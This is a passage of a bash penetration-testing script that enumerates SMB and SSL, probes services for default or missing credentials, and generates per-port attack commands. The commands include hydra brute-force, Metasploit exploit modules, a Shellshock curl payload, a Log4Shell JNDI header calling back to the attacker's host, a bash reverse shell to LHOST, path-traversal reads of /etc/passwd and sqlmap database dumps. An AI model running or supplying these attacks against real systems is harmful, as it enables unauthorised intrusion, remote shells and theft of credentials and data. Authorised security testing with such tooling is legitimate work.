                    echo "--- sslscan ---"
                    timeout 30 sslscan --no-colour "$ip:$port" 2>/dev/null || echo "N/A"
                fi

                echo ""
                echo "--- OpenSSL cert info ---"
                timeout 5 openssl s_client -connect "$ip:$port" -showcerts </dev/null 2>/dev/null \
                    | openssl x509 -noout -text 2>/dev/null | grep -E "Subject:|Issuer:|Not Before|Not After|DNS:" | head -20 || echo "N/A"

                echo ""
                echo "--- Weak cipher check (nmap) ---"
                timeout 60 nmap --script=ssl-enum-ciphers -p "$port" "$ip" 2>/dev/null | \
                    grep -E "weak|WARN|ERROR|TLSv|SSLv" || echo "N/A"

            } > "$ssl_file" 2>/dev/null

            local issues
            issues=$(grep -oiE "VULNERABLE|weak|SSLv2|SSLv3|RC4|NULL|EXPORT|POODLE|HEARTBLEED|CRIME|BEAST|DROWN" \
                "$ssl_file" 2>/dev/null | sort -u | tr '\n' ' ' || true)
            [[ -n "$issues" ]] && log CRIT "  SSL issues on $ip:$port → $issues"
            log DATA "  SSL audit: $ssl_file"
        done
    done
}

################################################################################
# PHASE 2f — DEEP SMB ENUMERATION
################################################################################
phase_smb_deep() {
    [[ $SMB_DEEP -eq 0 ]] && return
    log STEP "Phase 2f: Deep SMB Enumeration"

    local ip_list
    mapfile -t ip_list < <(xmllint --xpath \
        "//host/address[@addrtype='ipv4']/@addr" "$XML_OUT" 2>/dev/null \
        | grep -oP 'addr="\K[^"]+' || true)

    for ip in "${ip_list[@]}"; do
        local has_smb=0
        for p in 139 445; do
            xmllint --xpath \
                "//host[address/@addr='$ip']/ports/port[@portid='$p']" \
                "$XML_OUT" 2>/dev/null | grep -q "portid" && has_smb=1
        done
        [[ $has_smb -eq 0 ]] && continue

        local smb_file="$OUTDIR/loot/smb_enum_${ip}.txt"
        log INFO "  Deep SMB enum: $ip"
        {
            echo "=== SMB Deep Enum: $ip ==="
            echo ""

            echo "--- smbclient share list (null) ---"
            timeout 15 smbclient -L "//$ip" -N 2>/dev/null || echo "N/A"
            echo ""

            if command -v enum4linux &>/dev/null; then
                echo "--- enum4linux -a ---"
                timeout 60 enum4linux -a "$ip" 2>/dev/null || echo "N/A"
                echo ""
            fi

            if command -v rpcclient &>/dev/null; then
                echo "--- RPC null session ---"
                echo -e "enumdomusers\nenumdomgroups\nquerydispinfo\ngetdompwinfo" | \
                    timeout 15 rpcclient -U "" -N "$ip" 2>/dev/null || echo "N/A"
                echo ""
            fi

            if command -v crackmapexec &>/dev/null; then
                echo "--- CrackMapExec info ---"
                timeout 20 crackmapexec smb "$ip" 2>/dev/null || echo "N/A"
                echo ""
            fi

            echo "--- nmap smb-* scripts ---"
            timeout 60 nmap --script="smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb2-security-mode" \
                -p 139,445 "$ip" 2>/dev/null || echo "N/A"

        } > "$smb_file" 2>/dev/null
        log OK "  SMB enum saved: $smb_file"

        local users
        users=$(grep -oP "(?<=user:\[)[^\]]+" "$smb_file" 2>/dev/null | sort -u | tr '\n' ' ' || true)
        [[ -n "$users" ]] && {
            log FOUND "  SMB users found on $ip: $users"
            echo "$users" > "$OUTDIR/loot/smb_users_${ip}.txt"
        }
    done
}

################################################################################
# PHASE 2g — DEFAULT CREDENTIAL TESTING
################################################################################
phase_default_creds() {
    [[ $DEFAULT_CREDS -eq 0 ]] && return
    log STEP "Phase 2g: Default Credential Testing"

    local ip_list
    mapfile -t ip_list < <(xmllint --xpath \
        "//host/address[@addrtype='ipv4']/@addr" "$XML_OUT" 2>/dev/null \
        | grep -oP 'addr="\K[^"]+' || true)

    for ip in "${ip_list[@]}"; do
        local port_list
        mapfile -t port_list < <(xmllint --xpath \
            "//host[address/@addr='$ip']/ports/port/@portid" \
            "$XML_OUT" 2>/dev/null | grep -oP 'portid="\K[^"]+' || true)

        for port in "${port_list[@]}"; do
            local svc
            svc=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@name)" \
                "$XML_OUT" 2>/dev/null || true)

            local cred_key=""
            case "$port" in
                21)   cred_key="ftp" ;;
                22)   cred_key="ssh" ;;
                23)   cred_key="telnet" ;;
                3306) cred_key="mysql" ;;
                1433) cred_key="mssql" ;;
                5432) cred_key="postgres" ;;
                3389) cred_key="rdp" ;;
                5900|5901) cred_key="vnc" ;;
                6379) cred_key="redis" ;;
                27017|27018) cred_key="mongodb" ;;
                80|8080|8000|8008|8888) cred_key="http" ;;
                161)  cred_key="snmp" ;;
            esac

            if [[ "$svc" == *"tomcat"* || "$svc" == *"apache-coyote"* ]]; then cred_key="tomcat"; fi
            if [[ "$svc" == *"webmin"* ]]; then cred_key="webmin"; fi

            [[ -z "$cred_key" ]] && continue
            [[ -z "${DEFAULT_CREDS_DB[$cred_key]:-}" ]] && continue

            local creds_file="$OUTDIR/loot/default_creds_${ip}_${port}.txt"
            log INFO "  Testing default creds on $ip:$port ($cred_key)..."
            {
                echo "=== Default Cred Test: $ip:$port [$cred_key] ==="
                echo "Tested pairs:"
                for pair in ${DEFAULT_CREDS_DB[$cred_key]}; do
                    echo "  $pair"
                done
            } > "$creds_file"

            case "$cred_key" in
                redis)
                    if command -v redis-cli &>/dev/null; then
                        local r
                        r=$(timeout 3 redis-cli -h "$ip" -p "$port" ping 2>/dev/null || true)
                        if [[ "$r" == "PONG" ]]; then
                            log CRIT "  REDIS UNAUTHENTICATED: $ip:$port — no password required!"
                            echo "UNAUTHENTICATED ACCESS CONFIRMED" >> "$creds_file"
                            CRED_MAP["${ip}:${port}"]="NO_AUTH"
                            severity_add "$ip" "CRITICAL" "Redis unauthenticated access on port $port"
                        fi
                    fi ;;
                mongodb)
                    if command -v mongosh &>/dev/null || command -v mongo &>/dev/null; then
                        local mongo_cmd
                        mongo_cmd=$(command -v mongosh 2>/dev/null || command -v mongo 2>/dev/null)
                        local r
                        r=$(timeout 5 "$mongo_cmd" --host "$ip" --port "$port" \
                            --eval "db.adminCommand({listDatabases:1})" --quiet 2>/dev/null | head -3 || true)
                        if [[ -n "$r" && "$r" != *"Error"* && "$r" != *"Authentication"* ]]; then
                            log CRIT "  MONGODB UNAUTHENTICATED: $ip:$port!"
                            echo "UNAUTHENTICATED ACCESS CONFIRMED" >> "$creds_file"
                            CRED_MAP["${ip}:${port}"]="NO_AUTH"
                            severity_add "$ip" "CRITICAL" "MongoDB unauthenticated on port $port"
                        fi
                    fi ;;
                ftp)
                    if command -v curl &>/dev/null; then
                        local r
                        r=$(timeout 5 curl -s --max-time 5 \
                            "ftp://anonymous:anon@${ip}:${port}/" 2>/dev/null | head -3 || true)
                        [[ -n "$r" ]] && {
                            log CRIT "  FTP ANONYMOUS LOGIN: $ip:$port!"
                            echo "ANONYMOUS LOGIN CONFIRMED" >> "$creds_file"
                            CRED_MAP["${ip}:${port}"]="anonymous"
                            severity_add "$ip" "CRITICAL" "FTP anonymous login on port $port"
                        }
                    fi ;;
                snmp)
                    if command -v snmpwalk &>/dev/null; then
                        for comm in public private community; do
                            local r
                            r=$(timeout 5 snmpwalk -v2c -c "$comm" "$ip" 1.3.6.1.2.1.1.1 2>/dev/null | head -1 || true)
                            [[ -n "$r" ]] && {
                                log CRIT "  SNMP community '$comm' works on $ip!"
                                echo "COMMUNITY STRING: $comm" >> "$creds_file"
                                CRED_MAP["${ip}:${port}"]="$comm"
                                severity_add "$ip" "HIGH" "SNMP community string '$comm' on port $port"
                            }
                        done
                    fi ;;
            esac
        done
    done
}

################################################################################
# SEVERITY TRACKING
################################################################################
severity_add() {
    local ip="$1" level="$2" finding="$3"
    local key="${ip}_${level}_${RANDOM}"
    SEVERITY_MAP["$key"]="$finding"
    case "$level" in
        CRITICAL) ((CRITICAL_COUNT++)); ((TOTAL_VULNS++)) ;;
        HIGH)     ((HIGH_COUNT++));     ((TOTAL_VULNS++)) ;;
        MEDIUM)   ((MEDIUM_COUNT++));   ((TOTAL_VULNS++)) ;;
        LOW)      ((LOW_COUNT++));      ((TOTAL_VULNS++)) ;;
        INFO)     ((INFO_COUNT++)) ;;
    esac
}

################################################################################
# CVE EXTRACTION
################################################################################
extract_cves() {
    local ip="$1" port="$2" script_out="$3"
    local cves
    mapfile -t cves < <(echo "$script_out" | grep -oP 'CVE-\d{4}-\d+' | sort -u || true)
    if [[ ${#cves[@]} -gt 0 ]]; then
        CVE_MAP["${ip}:${port}"]="${cves[*]}"
        for cve in "${cves[@]}"; do
            echo "$cve" >> "$OUTDIR/loot/cve_list.txt"
            CONFIRMED_VULNS+=("${ip}:${port}:${cve}")
        done
        log CRIT "CVEs on $ip:$port → ${cves[*]}"
    fi
}

################################################################################
# PHASE 3 — XML PARSING & ATTACK MAPPING
################################################################################
parse_nmap_xml() {
    log STEP "Phase 3: Parsing Results & Mapping Attacks"

    local ip_list
    mapfile -t ip_list < <(xmllint --xpath \
        "//host/address[@addrtype='ipv4']/@addr" "$XML_OUT" 2>/dev/null \
        | grep -oP 'addr="\K[^"]+' || true)

    for ip in "${ip_list[@]}"; do
        ((HOSTS_SCANNED++))
        echo "$ip" >> "$RESUME_FILE"

        local hostname os_name os_accuracy mac_addr
        hostname=$(xmllint --xpath \
            "string(//host[address/@addr='$ip']/hostnames/hostname/@name)" \
            "$XML_OUT" 2>/dev/null || true)
        os_name=$(xmllint --xpath \
            "string(//host[address/@addr='$ip']/os/osmatch/@name)" \
            "$XML_OUT" 2>/dev/null || true)
        os_accuracy=$(xmllint --xpath \
            "string(//host[address/@addr='$ip']/os/osmatch/@accuracy)" \
            "$XML_OUT" 2>/dev/null || true)
        mac_addr=$(xmllint --xpath \
            "string(//host[address/@addr='$ip']/address[@addrtype='mac']/@addr)" \
            "$XML_OUT" 2>/dev/null || true)

        [[ -n "$hostname" ]] && HOSTNAME_MAP["$ip"]="$hostname"
        [[ -n "$os_name"   ]] && OS_MAP["$ip"]="${os_name}${os_accuracy:+ (${os_accuracy}%)}"

        local port_list
        mapfile -t port_list < <(xmllint --xpath \
            "//host[address/@addr='$ip']/ports/port/@portid" \
            "$XML_OUT" 2>/dev/null | grep -oP 'portid="\K[^"]+' || true)

        OPEN_PORTS_MAP["$ip"]="${port_list[*]:-}"

        for port in "${port_list[@]}"; do
            local service version product extra_info script_out cpe state protocol
            service=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@name)" \
                "$XML_OUT" 2>/dev/null || true)
            version=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@version)" \
                "$XML_OUT" 2>/dev/null || true)
            product=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@product)" \
                "$XML_OUT" 2>/dev/null || true)
            extra_info=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@extrainfo)" \
                "$XML_OUT" 2>/dev/null || true)
            cpe=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/cpe)" \
                "$XML_OUT" 2>/dev/null || true)
            script_out=$(xmllint --xpath \
                "//host[address/@addr='$ip']/ports/port[@portid='$port']/script" \
                "$XML_OUT" 2>/dev/null || true)
            protocol=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/@protocol)" \
                "$XML_OUT" 2>/dev/null || true)

            SERVICE_MAP["${ip}:${port}"]="${service}|${product}|${version}|${extra_info}|${cpe}|${protocol}"
            extract_cves "$ip" "$port" "$script_out"
            suggest_attacks "$ip" "$port" "$service" "$product" "$version" "$extra_info" "$script_out" "$cpe" "${mac_addr:-}"
        done
    done
}

################################################################################
# ATTACK SUGGESTION ENGINE
################################################################################
suggest_attacks() {
    local ip="$1" port="$2" service="$3" product="$4" version="$5"
    local extra_info="$6" script_out="$7" cpe="$8" mac="$9"
    local lh="${LHOST:-LHOST}"
    local suggestions=()
    local svc_lower
    svc_lower=$(echo "$service $product $version $extra_info" | tr '[:upper:]' '[:lower:]')
    local tech_hint="${TECH_MAP["${ip}:${port}"]:-}"
    local banner_hint="${BANNER_MAP["${ip}:${port}"]:-}"

    # — Version / CPE header —
    local ver_str=""
    [[ -n "$product" || -n "$version" ]] && ver_str="$product $version"
    [[ -n "$cpe" ]]                       && ver_str+=" [$cpe]"
    [[ -n "$ver_str" ]] && suggestions+=("  ${DIM}Version  : $ver_str${RESET}")
    [[ -n "$mac" ]]     && suggestions+=("  ${DIM}MAC      : $mac${RESET}")
    [[ -n "$tech_hint" ]] && suggestions+=("  ${DIM}Tech     : $tech_hint${RESET}")
    [[ -n "$banner_hint" ]] && suggestions+=("  ${DIM}Banner   : $(echo "$banner_hint" | head -1)${RESET}")

    case "$port" in

    ##########################################################################
    21) # FTP
    ##########################################################################
        suggestions+=("${LCYAN}── FTP :$port ────────────────────────────────────────────${RESET}")
        severity_add "$ip" "MEDIUM" "FTP on $port"

        suggestions+=("  ${BOLD}[Reconnaisance]${RESET}")
        suggestions+=("    nmap --script=ftp-anon,ftp-bounce,ftp-syst,ftp-brute -p $port $ip")
        suggestions+=("    ftp $ip $port                    # manual: try anonymous:anonymous")

        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -t $THREADS -s $port ftp://$ip")
        suggestions+=("    medusa -h $ip -U $WORDLIST_USERS -P $WORDLIST_PASS -M ftp -n $port")

        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/ftp/anonymous    | set RHOSTS $ip | set RPORT $port | run")
        suggestions+=("    use auxiliary/scanner/ftp/ftp_login    | set RHOSTS $ip | set RPORT $port | set USER_FILE $WORDLIST_USERS | set PASS_FILE $WORDLIST_PASS | run")
        suggestions+=("    use auxiliary/scanner/ftp/ftp_version  | set RHOSTS $ip | run")

        if [[ "$svc_lower" == *"vsftpd 2.3.4"* ]]; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: vsftpd 2.3.4 BACKDOOR (CVE-2011-2523) ***${RESET}")
            suggestions+=("    use exploit/unix/ftp/vsftpd_234_backdoor | set RHOSTS $ip | run")
            suggestions+=("    # Direct: nc $ip 6200  (after triggering with USER user:)")
            severity_add "$ip" "CRITICAL" "vsftpd 2.3.4 backdoor CVE-2011-2523 port $port"
            [[ $POST_EXPLOIT_HINTS -eq 1 ]] && POSTEXPLOIT_MAP["$ip"]="${POSTEXPLOIT_DB[linux_shell]}"
        fi
        if [[ "$svc_lower" == *"proftpd 1.3.3"* ]]; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: ProFTPD 1.3.3c BACKDOOR ***${RESET}")
            suggestions+=("    use exploit/unix/ftp/proftpd_133c_backdoor | set RHOSTS $ip | run")
            severity_add "$ip" "CRITICAL" "ProFTPD 1.3.3c backdoor port $port"
        fi
        if [[ "$svc_lower" == *"proftpd 1.3.5"* ]]; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: ProFTPD 1.3.5 mod_copy RCE ***${RESET}")
            suggestions+=("    use exploit/unix/ftp/proftpd_modcopy_exec | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
            severity_add "$ip" "CRITICAL" "ProFTPD 1.3.5 mod_copy RCE port $port"
        fi
        ;;

    ##########################################################################
    22) # SSH
    ##########################################################################
        suggestions+=("${LCYAN}── SSH :$port ────────────────────────────────────────────${RESET}")
        severity_add "$ip" "LOW" "SSH on $port"

        suggestions+=("  ${BOLD}[Reconnaisance]${RESET}")
        suggestions+=("    ssh-audit $ip -p $port")
        suggestions+=("    nmap --script=ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -p $port $ip")

        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -t 4 -s $port ssh://$ip")
        suggestions+=("    medusa -h $ip -U $WORDLIST_USERS -P $WORDLIST_PASS -M ssh -n $port -t 4")
        suggestions+=("    patator ssh_login host=$ip port=$port user=FILE0 password=FILE1 0=$WORDLIST_USERS 1=$WORDLIST_PASS")

        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/ssh/ssh_login          | set RHOSTS $ip | set RPORT $port | set USER_FILE $WORDLIST_USERS | set PASS_FILE $WORDLIST_PASS | run")
        suggestions+=("    use auxiliary/scanner/ssh/ssh_enumusers      | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/ssh/ssh_identify_pubkeys| set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/ssh/ssh_version        | set RHOSTS $ip | run")

        suggestions+=("  ${BOLD}[Key-based access]${RESET}")
        suggestions+=("    ssh -i id_rsa root@$ip -p $port")
        suggestions+=("    for key in ~/.ssh/id_*; do ssh -i \$key root@$ip -p $port -o BatchMode=yes 2>/dev/null && echo \"KEY WORKS: \$key\"; done")

        suggestions+=("  ${BOLD}[Post-compromise]${RESET}")
        suggestions+=("    ssh user@$ip 'bash -i >& /dev/tcp/$lh/$LPORT 0>&1'")
        suggestions+=("    ssh -R $LPORT:localhost:22 user@$ip           # reverse tunnel")
        suggestions+=("    ssh -D 1080 user@$ip -p $port -N               # SOCKS proxy")

        if echo "$script_out" | grep -qi "CVE-2018-15473"; then
            suggestions+=("  ${LRED}${BOLD}*** HIGH: OpenSSH User Enumeration (CVE-2018-15473) ***${RESET}")
            suggestions+=("    use auxiliary/scanner/ssh/ssh_enumusers | set RHOSTS $ip | set USER_FILE $WORDLIST_USERS | run")
            severity_add "$ip" "HIGH" "CVE-2018-15473 user enum port $port"
        fi
        if echo "$script_out" | grep -qi "CVE-2023-38408"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: OpenSSH agent hijack (CVE-2023-38408) ***${RESET}")
            severity_add "$ip" "CRITICAL" "CVE-2023-38408 ssh-agent RCE port $port"
        fi
        ;;

    ##########################################################################
    23) # Telnet
    ##########################################################################
        suggestions+=("${LCYAN}── Telnet :$port ─────────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "Telnet (cleartext) on $port"
        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -t 4 -s $port telnet://$ip")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/telnet/telnet_login   | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/telnet/telnet_version | set RHOSTS $ip | run")
        suggestions+=("  ${BOLD}[Manual]${RESET}")
        suggestions+=("    telnet $ip $port")
        suggestions+=("    nc -nvv $ip $port")
        ;;

    ##########################################################################
    25|587|465) # SMTP
    ##########################################################################
        suggestions+=("${LCYAN}── SMTP :$port ───────────────────────────────────────────${RESET}")
        severity_add "$ip" "MEDIUM" "SMTP on $port"
        suggestions+=("  ${BOLD}[User enumeration]${RESET}")
        suggestions+=("    smtp-user-enum -M VRFY -U $WORDLIST_USERS -t $ip -p $port")
        suggestions+=("    smtp-user-enum -M EXPN -U $WORDLIST_USERS -t $ip -p $port")
        suggestions+=("    smtp-user-enum -M RCPT -U $WORDLIST_USERS -t $ip -p $port")
        suggestions+=("    use auxiliary/scanner/smtp/smtp_enum         | set RHOSTS $ip | set RPORT $port | run")
        suggestions+=("  ${BOLD}[Relay check]${RESET}")
        suggestions+=("    use auxiliary/scanner/smtp/smtp_relay        | set RHOSTS $ip | run")
        suggestions+=("    nmap --script=smtp-open-relay -p $port $ip")
        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -s $port smtp://$ip")
        ;;

    ##########################################################################
    53) # DNS
    ##########################################################################
        suggestions+=("${LCYAN}── DNS :$port ────────────────────────────────────────────${RESET}")
        severity_add "$ip" "MEDIUM" "DNS on $port"
        suggestions+=("  ${BOLD}[Zone transfer]${RESET}")
        suggestions+=("    dig axfr @$ip")
        suggestions+=("    host -l <DOMAIN> $ip")
        suggestions+=("    nmap --script=dns-zone-transfer,dns-recursion -p 53 $ip")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/gather/dns_axfr               | set DOMAIN <DOMAIN> | set SERVER $ip | run")
        suggestions+=("    use auxiliary/gather/dns_info               | set DOMAIN <DOMAIN> | run")
        suggestions+=("  ${BOLD}[DNS cache snoop]${RESET}")
        suggestions+=("    nmap --script=dns-cache-snoop --script-args='dns-cache-snoop.mode=nonrecursive,dns-cache-snoop.domains={google.com}' -p 53 $ip")
        ;;

    ##########################################################################
    80|8080|8000|8008|8888|8001|8009) # HTTP
    ##########################################################################
        suggestions+=("${LCYAN}── HTTP :$port ───────────────────────────────────────────${RESET}")
        severity_add "$ip" "MEDIUM" "HTTP on $port"

        suggestions+=("  ${BOLD}[Initial recon]${RESET}")
        suggestions+=("    curl -skI http://$ip:$port/")
        suggestions+=("    whatweb http://$ip:$port -a 3")
        suggestions+=("    nmap --script=http-headers,http-methods,http-title -p $port $ip")

        suggestions+=("  ${BOLD}[Directory & file brute-force]${RESET}")
        suggestions+=("    gobuster dir -u http://$ip:$port -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip -t $THREADS -o $OUTDIR/web/gobuster_${ip}_${port}.txt")
        suggestions+=("    feroxbuster --url http://$ip:$port -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t $THREADS -o $OUTDIR/web/ferox_${ip}_${port}.txt")
        suggestions+=("    dirsearch -u http://$ip:$port -e php,html,js,txt,bak -t $THREADS -o $OUTDIR/web/dirsearch_${ip}_${port}.txt")

        suggestions+=("  ${BOLD}[Vulnerability scan]${RESET}")
        suggestions+=("    nikto -h http://$ip:$port -output $OUTDIR/web/nikto_${ip}_${port}.txt")
        suggestions+=("    nuclei -u http://$ip:$port -o $OUTDIR/web/nuclei_${ip}_${port}.txt")

        suggestions+=("  ${BOLD}[Injection]${RESET}")
        suggestions+=("    sqlmap -u 'http://$ip:$port/?id=1' --dbs --batch --output-dir $OUTDIR/web/sqlmap_${ip}_${port}")
        suggestions+=("    sqlmap -u 'http://$ip:$port/' --crawl=3 --level=5 --risk=3 --batch --dbs")
        suggestions+=("    dalfox url http://$ip:$port/                 # XSS")

        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/http/http_version      | set RHOSTS $ip | set RPORT $port | run")
        suggestions+=("    use auxiliary/scanner/http/options           | set RHOSTS $ip | set RPORT $port | run")
        suggestions+=("    use auxiliary/scanner/http/dir_listing       | set RHOSTS $ip | set RPORT $port | run")
        suggestions+=("    use auxiliary/scanner/http/http_put          | set RHOSTS $ip | set RPORT $port | run")

        # Apache
        if [[ "$svc_lower" == *"apache"* ]]; then
            suggestions+=("  ${BOLD}[Apache]${RESET}")
            suggestions+=("    searchsploit apache $version")
            suggestions+=("    use auxiliary/scanner/http/apache_userdir_enum | set RHOSTS $ip | set RPORT $port | run")
        fi

        # Nginx
        [[ "$svc_lower" == *"nginx"* ]] && {
            suggestions+=("  ${BOLD}[Nginx]${RESET}")
            suggestions+=("    searchsploit nginx $version")
            suggestions+=("    # Check for path traversal: curl http://$ip:$port/../../../etc/passwd")
        }

        # IIS
        [[ "$svc_lower" == *"iis"* || "$svc_lower" == *"microsoft"* ]] && {
            suggestions+=("  ${BOLD}[IIS / WebDAV]${RESET}")
            suggestions+=("    use auxiliary/scanner/http/webdav_scanner     | set RHOSTS $ip | set RPORT $port | run")
            suggestions+=("    use auxiliary/scanner/http/webdav_internal_ip | set RHOSTS $ip | set RPORT $port | run")
            suggestions+=("    cadaver http://$ip:$port/                      # WebDAV client")
            severity_add "$ip" "MEDIUM" "IIS/WebDAV on port $port"
        }

        # phpMyAdmin
        if [[ "$svc_lower" == *"phpmyadmin"* || "$script_out" == *"phpMyAdmin"* || "$tech_hint" == *"phpMyAdmin"* ]]; then
            suggestions+=("  ${LRED}${BOLD}*** HIGH: phpMyAdmin detected ***${RESET}")
            suggestions+=("    use exploit/multi/http/phpmyadmin_lfi_rce     | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("    # Try default creds: root / (empty), root/root, root/password")
            severity_add "$ip" "HIGH" "phpMyAdmin on $ip:$port"
        fi

        # WordPress
        if [[ "$tech_hint" == *"WordPress"* || "$script_out" == *"wp-content"* ]]; then
            suggestions+=("  ${LRED}${BOLD}*** HIGH: WordPress detected ***${RESET}")
            suggestions+=("    wpscan --url http://$ip:$port --enumerate u,p,t,cb,dbe --api-token <TOKEN>")
            suggestions+=("    wpscan --url http://$ip:$port -U $WORDLIST_USERS -P $WORDLIST_PASS --password-attack xmlrpc")
            suggestions+=("    use auxiliary/scanner/http/wordpress_login_enum | set RHOSTS $ip | set RPORT $port | run")
            severity_add "$ip" "HIGH" "WordPress on $ip:$port"
        fi

        # Joomla
        [[ "$tech_hint" == *"Joomla"* ]] && {
            suggestions+=("  ${LRED}${BOLD}*** HIGH: Joomla detected ***${RESET}")
            suggestions+=("    joomscan --url http://$ip:$port")
            suggestions+=("    use auxiliary/scanner/http/joomla_version | set RHOSTS $ip | set RPORT $port | run")
            severity_add "$ip" "HIGH" "Joomla on $ip:$port"
        }

        # Drupal
        [[ "$tech_hint" == *"Drupal"* ]] && {
            suggestions+=("  ${LRED}${BOLD}*** HIGH: Drupal detected ***${RESET}")
            suggestions+=("    droopescan scan drupal -u http://$ip:$port")
            suggestions+=("    use exploit/unix/webapp/drupal_drupalgeddon2 | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("    use exploit/unix/webapp/drupal_restws_unserialize | set RHOSTS $ip | set RPORT $port | run")
            severity_add "$ip" "CRITICAL" "Drupal on $ip:$port"
        }

        # Jenkins
        [[ "$tech_hint" == *"Jenkins"* || "$script_out" == *"Jenkins"* ]] && {
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: Jenkins detected ***${RESET}")
            suggestions+=("    use exploit/multi/http/jenkins_script_console | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("    # Groovy RCE via script console: http://$ip:$port/script")
            suggestions+=("    curl -s http://$ip:$port/api/json?pretty=true    # unauthenticated API check")
            severity_add "$ip" "CRITICAL" "Jenkins on $ip:$port"
        }

        # Shellshock
        if echo "$script_out" | grep -qi "shellshock\|CVE-2014-6271"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: Shellshock (CVE-2014-6271) ***${RESET}")
            suggestions+=("    use exploit/multi/http/apache_mod_cgi_bash_env_exec | set RHOSTS $ip | set RPORT $port | set TARGETURI /cgi-bin/test.sh | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("    curl -A '() { ignored; }; echo Content-Type: text/plain; echo; /bin/id' http://$ip:$port/cgi-bin/test.sh")
            severity_add "$ip" "CRITICAL" "Shellshock CVE-2014-6271 port $port"
        fi

        # Log4Shell
        if echo "$script_out" | grep -qi "log4shell\|CVE-2021-44228\|CVE-2021-45046"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: Log4Shell (CVE-2021-44228) ***${RESET}")
            suggestions+=("    # PoC: curl -H 'X-Api-Version: \${jndi:ldap://$lh:1389/exploit}' http://$ip:$port/")
            suggestions+=("    use exploit/multi/misc/log4shell_header_injection | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            severity_add "$ip" "CRITICAL" "Log4Shell CVE-2021-44228 port $port"
        fi

        # Spring4Shell
        if echo "$script_out" | grep -qi "spring4shell\|CVE-2022-22965"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: Spring4Shell (CVE-2022-22965) ***${RESET}")
            suggestions+=("    use exploit/multi/http/spring_framework_rce_spring4shell | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            severity_add "$ip" "CRITICAL" "Spring4Shell CVE-2022-22965 port $port"
        fi

        # LFI / path traversal hints
        if echo "$script_out" | grep -qi "http-lfi\|path traversal\|directory traversal"; then
            suggestions+=("  ${LRED}${BOLD}*** HIGH: LFI/Path Traversal detected ***${RESET}")
            suggestions+=("    # Try: curl 'http://$ip:$port/page?file=../../../../etc/passwd'")
            suggestions+=("    # Try: curl 'http://$ip:$port/page?file=php://filter/convert.base64-encode/resource=/etc/passwd'")
            suggestions+=("    cadaver http://$ip:$port/")
            severity_add "$ip" "HIGH" "LFI/Path traversal hint port $port"
        fi

        # SQL injection
        if echo "$script_out" | grep -qi "http-sql-injection\|SQLi\|sql injection"; then
            suggestions+=("  ${LRED}${BOLD}*** HIGH: SQL Injection hint from nmap ***${RESET}")
            suggestions+=("    sqlmap -u 'http://$ip:$port/' --crawl=3 --level=5 --risk=3 --batch --dbs --dump")
            severity_add "$ip" "HIGH" "SQLi hint port $port"
        fi
        ;;

    ##########################################################################
    443|8443|4443) # HTTPS
    ##########################################################################
        suggestions+=("${LCYAN}── HTTPS :$port ──────────────────────────────────────────${RESET}")
        severity_add "$ip" "MEDIUM" "HTTPS on $port"

        suggestions+=("  ${BOLD}[Recon]${RESET}")
        suggestions+=("    curl -skI https://$ip:$port/")
        suggestions+=("    nmap --script=ssl-cert,ssl-enum-ciphers,https-redirect -p $port $ip")

        suggestions+=("  ${BOLD}[Directory brute-force]${RESET}")
        suggestions+=("    gobuster dir -u https://$ip:$port -w /usr/share/wordlists/dirb/common.txt -k -t $THREADS")
        suggestions+=("    feroxbuster --url https://$ip:$port -k -t $THREADS")
        suggestions+=("    nikto -h https://$ip:$port -ssl -output $OUTDIR/web/nikto_${ip}_${port}.txt")
        suggestions+=("    nuclei -u https://$ip:$port -o $OUTDIR/web/nuclei_${ip}_${port}.txt")

